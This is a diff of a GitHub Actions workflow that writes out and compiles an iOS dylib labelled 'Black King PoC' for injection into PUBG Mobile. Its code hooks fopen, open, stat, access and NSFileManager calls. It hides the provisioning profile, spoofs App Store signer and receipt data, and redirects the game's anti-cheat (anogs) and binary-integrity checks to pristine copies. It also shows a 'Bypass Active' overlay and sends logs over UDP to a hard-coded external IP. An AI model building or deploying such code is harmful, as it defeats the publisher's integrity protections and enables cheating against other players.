@@ -1,181 +1,215 @@
-name: Imperial V-MAX - 15s Sync & 5-Point Shield
-
-on:
-  push:
-    branches: [ "main" ]
-  workflow_dispatch:
-
+name: Black King Professional PoC
+on: [push, workflow_dispatch]
 jobs:
-  build_shield:
-    name: Compile 15s Synced Dylib
+  build:
     runs-on: macos-latest
-
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Download Fishhook
-        run: |
+      - uses: actions/checkout@v4
+      - run: |
           mkdir -p jni
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
-
-      - name: Generate Synced Source (Main.mm)
-        run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
           #import <UIKit/UIKit.h>
-          #import <objc/runtime.h>
+          #import <mach-o/dyld.h>
+          #import <dlfcn.h>
+          #import <sys/stat.h>
           #import <sys/socket.h>
           #import <arpa/inet.h>
-          #import <sys/stat.h>
-          #import <dlfcn.h>
+          #import <fcntl.h>
+          #import <unistd.h>
+          #import <objc/runtime.h>
           #include "fishhook.h"
 
-          // ⚠️⚠️ تنبيه مهم لمسعود: غير هذا الآيبي إلى آيبي حاسبتك الفعلي (IPv4)
-          #define RADAR_SERVER_IP "pubg.myvnc.com" 
-          #define RADAR_SERVER_PORT 8080
+          // ⚠️ غير هذا الآيبي إلى عنوان سيرفر الرادار (اللابتوب/RDP) مالتك
+          #define RADAR_IP "107.172.132.40"
+          #define RADAR_PORT 8080
 
           // ==========================================
-          // 📡 نظام الاتصال الحي بالترمنال
+          // 📡 نظام الإرسال للرادار (Logging)
           // ==========================================
-          void SendToMasoudTerminal(NSString* action, NSString* details) {
+          void SendToRadar(NSString *type, NSString *action, NSString *target) {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                   NSDictionary *payload = @{
-                      @"type": @"SYNC_LOG",
-                      @"caller": @"Masoud_Dylib",
-                      @"func": action,
-                      @"target": details
+                      @"type": type,
+                      @"action": action,
+                      @"target": target
                   };
-                  NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-                  if (!json) return;
-
+                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+                  if (!jsonData) return;
+        
                   int sock = socket(AF_INET, SOCK_DGRAM, 0);
                   if (sock > 0) {
                       struct sockaddr_in srv;
                       srv.sin_family = AF_INET;
-                      srv.sin_port = htons(RADAR_SERVER_PORT);
-                      inet_pton(AF_INET, RADAR_SERVER_IP, &srv.sin_addr);
-                      sendto(sock, [json bytes], [json length], 0, (struct sockaddr *)&srv, sizeof(srv));
+                      srv.sin_port = htons(RADAR_PORT);
+                      inet_pton(AF_INET, RADAR_IP, &srv.sin_addr);
+                      sendto(sock, [jsonData bytes], [jsonData length], 0, (struct sockaddr *)&srv, sizeof(srv));
                       close(sock);
                   }
               });
           }
 
-          // ==========================================
-          // 🛡️ النقاط الـ 5 لكشف النسخ المكركة (Spoofing)
-          // ==========================================
-          
+          // ======================================================================
+          // 🎭 1. نظام تزييف بيئة متجر آبل (Environment Spoofing)
+          // ======================================================================
           void SafeSwizzle(Class c, SEL orig, IMP newImp, IMP* oldImp) {
               Method m = class_getInstanceMethod(c, orig);
               if (!m) m = class_getClassMethod(c, orig);
               if (m) { *oldImp = method_getImplementation(m); method_setImplementation(m, newImp); }
           }
 
-          // 🟢 النقطة 1: إخفاء ملف الشهادة (mobileprovision)
           typedef BOOL (*fileExistsAtPath_t)(id, SEL, NSString *);
           static fileExistsAtPath_t orig_fileExistsAtPath;
           BOOL hk_fileExistsAtPath(id self, SEL _cmd, NSString *path) {
               if (path && [path isKindOfClass:[NSString class]]) {
                   if ([path containsString:@"embedded.mobileprovision"]) {
-                      SendToMasoudTerminal(@"[CHECK 1 PASSED]", @"Hidden embedded.mobileprovision");
+                      SendToRadar(@"SPOOF", @"Hidden Provisioning Profile", path);
                       return NO; 
                   }
               }
               return orig_fileExistsAtPath(self, _cmd, path);
           }
 
-          // 🟢 النقطة 2: تزييف هوية المطور للآب ستور (SignerIdentity)
           typedef NSDictionary* (*infoDict_t)(id, SEL);
           static infoDict_t orig_infoDict;
           NSDictionary* hk_infoDict(id self, SEL _cmd) {
               NSDictionary *dict = orig_infoDict(self, _cmd);
               if (!dict) return nil;
               NSMutableDictionary *mDict = [dict mutableCopy];
-              if (mDict) {
-                  [mDict setObject:@"Apple iPhone OS Application Signer" forKey:@"SignerIdentity"];
-                  [mDict setObject:@"com.apple.itunes.store" forKey:@"AppStoreInstaller"];
-                  return [mDict copy];
-              }
-              return dict;
+              [mDict setObject:@"Apple iPhone OS Application Signer" forKey:@"SignerIdentity"];
+              [mDict setObject:@"com.apple.itunes.store" forKey:@"AppStoreInstaller"];
+              SendToRadar(@"SPOOF", @"Spoofed Signer Identity", @"Apple App Store");
+              return [mDict copy];
           }
 
-          // 🟢 النقطة 3: توجيه إيصال الشراء الرسمي
-          void SpoofReceipt() {
-              method_setImplementation(class_getInstanceMethod([NSBundle class], @selector(appStoreReceiptURL)), 
-                  imp_implementationWithBlock(^NSURL* (id self) {
-                      return [NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/StoreServices.framework/receipt"];
-                  }));
-          }
-
-          // 🟢 النقطة 4 و 5: التوجيه المزدوج لـ (Shadow & anogs)
+          // ==========================================
+          // 🛡️ 2. نظام التوجيه المزدوج (Dual File Redirector)
+          // ==========================================
           static FILE* (*orig_fopen)(const char *filename, const char *mode);
+          static int (*orig_open)(const char *path, int oflag, ...);
           static int (*orig_access)(const char *path, int amode);
+          static int (*orig_stat)(const char *restrict path, struct stat *restrict buf);
 
-          const char* GetCleanPath(const char* originalPath) {
+          const char* GetRedirectedPath(const char* originalPath) {
               if (!originalPath) return originalPath;
-              NSString* p = [NSString stringWithUTF8String:originalPath];
-              if ([p containsString:@"_original.dat"]) return originalPath;
-              
-              if ([p containsString:@"anogs.dylib"]) {
-                  SendToMasoudTerminal(@"[CHECK 4 PASSED]", @"anogs redirected to anogs_original.dat");
-                  return strdup([[p stringByReplacingOccurrencesOfString:@"anogs.dylib" withString:@"anogs_original.dat"] UTF8String]);
+              NSString* pathStr = [NSString stringWithUTF8String:originalPath];
+    
+              if ([pathStr containsString:@"_original.dat"]) return originalPath;
+    
+              if ([pathStr containsString:@"anogs.dylib"]) {
+                  NSString* cleanPath = [pathStr stringByReplacingOccurrencesOfString:@"anogs.dylib" withString:@"anogs_original.dat"];
+                  SendToRadar(@"REDIRECT", @"Intercepted anogs Check", cleanPath);
+                  return strdup([cleanPath UTF8String]);
               }
-              if ([p containsString:@"ShadowTrackerExtra"]) {
-                  SendToMasoudTerminal(@"[CHECK 5 PASSED]", @"Shadow redirected to ShadowTracker_original.dat");
-                  return strdup([[p stringByReplacingOccurrencesOfString:@"ShadowTrackerExtra" withString:@"ShadowTracker_original.dat"] UTF8String]);
+    
+              if ([pathStr containsString:@"ShadowTrackerExtra"]) {
+                  NSString* cleanPath = [pathStr stringByReplacingOccurrencesOfString:@"ShadowTrackerExtra" withString:@"ShadowTracker_original.dat"];
+                  SendToRadar(@"REDIRECT", @"Intercepted ShadowTracker Check", cleanPath);
+                  return strdup([cleanPath UTF8String]);
               }
+    
               return originalPath;
           }
 
-          FILE* hk_fopen(const char *filename, const char *mode) { return orig_fopen(GetCleanPath(filename), mode); }
-          int hk_access(const char *path, int amode) { return orig_access(GetCleanPath(path), amode); }
+          FILE* hk_fopen(const char *filename, const char *mode) { return orig_fopen(GetRedirectedPath(filename), mode); }
+          int hk_stat(const char *restrict path, struct stat *restrict buf) { return orig_stat(GetRedirectedPath(path), buf); }
+          int hk_access(const char *path, int amode) { return orig_access(GetRedirectedPath(path), amode); }
+          int hk_open(const char *path, int oflag, ...) {
+              va_list args; va_start(args, oflag);
+              mode_t mode = va_arg(args, int); va_end(args);
+              return orig_open(GetRedirectedPath(path), oflag, mode);
+          }
 
           // ==========================================
-          // 🚀 نظام المزامنة والعد التنازلي (15 ثانية)
+          // 🎨 3. واجهة إثبات المفهوم (Premium Top HUD)
           // ==========================================
-          __attribute__((constructor))
-          static void deploy_15s_sync() {
-              // إرسال إشارة للترمنال أن الدايلب دخل اللعبة
-              SendToMasoudTerminal(@"[SYSTEM]", @"🦅 Masoud Dylib Injected. Waiting 15s for Engine to unpack...");
-              
-              // نبضات كل 3 ثواني للترمنال حتى تعرف انه كاعد يشتغل
-              for (int i = 3; i <= 12; i += 3) {
-                  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, i * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                      SendToMasoudTerminal(@"[TIMER]", [NSString stringWithFormat:@"Engine stabilizing... %d seconds passed", i]);
-                  });
+          @interface BlackKingUI : NSObject
+          + (instancetype)shared;
+          @property (nonatomic, strong) UIButton *topHUD;
+          @end
+
+          @implementation BlackKingUI
+          + (instancetype)shared {
+              static BlackKingUI *i; static dispatch_once_t o;
+              dispatch_once(&o, ^{ i = [[BlackKingUI alloc] init]; }); return i;
+          }
+
+          - (void)drawTopHUD {
+              UIWindow *w = [UIApplication sharedApplication].keyWindow;
+              if(!w) return;
+
+              CGFloat hudWidth = 340; CGFloat hudHeight = 35;
+              self.topHUD = [UIButton buttonWithType:UIButtonTypeCustom];
+    
+              // تصميم متناسق ملاصق للسقف بالمنتصف
+              self.topHUD.frame = CGRectMake((w.bounds.size.width - hudWidth)/2, -40, hudWidth, hudHeight);
+              self.topHUD.backgroundColor = [UIColor colorWithWhite:0 alpha:0.75]; // أسود شفاف أنيق
+    
+              // تدوير الزوايا السفلية فقط
+              if (@available(iOS 11.0, *)) {
+                  self.topHUD.layer.cornerRadius = 16;
+                  self.topHUD.layer.maskedCorners = kCALayerMinXMaxYCorner | kCALayerMaxXMaxYCorner;
+              } else { 
+                  self.topHUD.layer.cornerRadius = 16; 
               }
+              self.topHUD.layer.borderWidth = 1; 
+              self.topHUD.layer.borderColor = [UIColor colorWithWhite:1.0 alpha:0.1].CGColor;
+    
+              [w addSubview:self.topHUD];
+    
+              // حركة النزول السلسة
+              [UIView animateWithDuration:0.6 delay:0.5 usingSpringWithDamping:0.7 initialSpringVelocity:0.5 options:0 animations:^{
+                  self.topHUD.frame = CGRectMake((w.bounds.size.width - hudWidth)/2, 0, hudWidth, hudHeight);
+              } completion:nil];
+    
+              // تنسيق النص باحترافية
+              NSString *fullText = @"🛡️ Bypass Active  |  🟢 Safe  |  BLACK KING";
+              NSMutableAttributedString *attStr = [[NSMutableAttributedString alloc] initWithString:fullText];
+              UIFont *font = [UIFont fontWithName:@"CourierNewPS-BoldMT" size:11] ?: [UIFont boldSystemFontOfSize:11];
+    
+              [attStr addAttribute:NSFontAttributeName value:font range:NSMakeRange(0, fullText.length)];
+              [attStr addAttribute:NSForegroundColorAttributeName value:[UIColor colorWithRed:1.0 green:0.2 blue:0.2 alpha:1.0] range:[fullText rangeOfString:@"BLACK KING"]];
+              [attStr addAttribute:NSForegroundColorAttributeName value:[UIColor darkGrayColor] range:[fullText rangeOfString:@"|"]];
+              [attStr addAttribute:NSForegroundColorAttributeName value:[UIColor colorWithRed:0.2 green:0.8 blue:0.2 alpha:1.0] range:[fullText rangeOfString:@"Bypass Active"]];
+              [attStr addAttribute:NSForegroundColorAttributeName value:[UIColor colorWithRed:0.2 green:0.8 blue:0.2 alpha:1.0] range:[fullText rangeOfString:@"Safe"]];
+    
+              [self.topHUD setAttributedTitle:attStr forState:UIControlStateNormal];
+          }
+          @end
 
-              // اللحظة الحاسمة: تفعيل الـ 5 نقاط بعد 15 ثانية بالتمام!
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  
-                  SendToMasoudTerminal(@"[SYSTEM]", @"🚀 15s Reached! Deploying the 5-Point Anti-Crack Shield...");
-                  
+          __attribute__((constructor))
+          static void start_poc_lab() {
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+        
+                  SendToRadar(@"SYSTEM", @"Dylib Injected Successfully", @"Waiting for Anti-Cheat Scans...");
+        
+                  [[BlackKingUI shared] drawTopHUD];
+        
                   SafeSwizzle([NSFileManager class], @selector(fileExistsAtPath:), (IMP)hk_fileExistsAtPath, (IMP*)&orig_fileExistsAtPath);
                   SafeSwizzle([NSBundle class], @selector(infoDictionary), (IMP)hk_infoDict, (IMP*)&orig_infoDict);
-                  SpoofReceipt();
-                  
+                  method_setImplementation(class_getInstanceMethod([NSBundle class], @selector(appStoreReceiptURL)), 
+                      imp_implementationWithBlock(^NSURL* (id self) {
+                          SendToRadar(@"SPOOF", @"Redirected App Store Receipt", @"/System/Library/...");
+                          return [NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/StoreServices.framework/receipt"];
+                      }));
+        
                   struct rebinding hooks[] = {
                       {"fopen", (void *)hk_fopen, (void **)&orig_fopen},
+                      {"open", (void *)hk_open, (void **)&orig_open},
+                      {"stat", (void *)hk_stat, (void **)&orig_stat},
                       {"access", (void *)hk_access, (void **)&orig_access}
                   };
-                  rebind_symbols(hooks, 2);
-                  
-                  SendToMasoudTerminal(@"[SUCCESS]", @"✅ All 5 Checks Spoofed Successfully! You are fully protected.");
+                  rebind_symbols(hooks, 4);
+        
               });
           }
+
           EOF
-
-      - name: 🚀 Compile 15s Synced Dylib
-        run: |
-          clang++ -dynamiclib -std=c++11 -arch arm64 \
-          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Masoud-15s-Shield.dylib \
-          -framework Foundation -framework UIKit -lobjc
-          strip -x Masoud-15s-Shield.dylib
-
-      - name: 📦 Upload Artifact
-        uses: actions/upload-artifact@v4
+          clang++ -dynamiclib -std=c++11 -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) jni/main.mm jni/fishhook.c -o BlackKingPoC.dylib -framework Foundation -framework UIKit -lobjc
+          strip -x BlackKingPoC.dylib
+      - uses: actions/upload-artifact@v4
         with:
-          name: Masoud-15s-Shield-Dylib
-          path: Masoud-15s-Shield.dylib
+          name: BlackKing-Pro-PoC
+          path: BlackKingPoC.dylib
